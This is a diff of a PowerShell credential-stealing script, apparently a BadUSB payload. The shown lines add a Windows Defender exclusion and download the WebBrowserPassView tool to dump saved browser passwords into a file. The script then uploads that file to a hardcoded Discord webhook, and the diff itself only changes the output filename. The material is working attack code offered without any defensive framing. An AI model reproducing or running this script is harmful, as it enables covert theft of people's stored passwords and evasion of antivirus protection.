@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antiviru
 
 Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
-.\WebBrowserPassView.exe /stext $env:TEMP/$env:passwords.txt #Create the file for Browser passwords
+.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt #Create the file for Browser passwords
 
 Start-Sleep -Seconds 10
 
@@ -27,7 +27,7 @@ param (
 )
 $dc = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 $hookurl = "$dc"
-$file = "$dir\$env:passwords.txt"
+$file = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 $Body = @{
   'username' = $env:username
   'content' = $text
@@ -35,10 +35,10 @@ $Body = @{
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:passwords.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"}
 
 #curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $hookurl >$null 2>&1
 
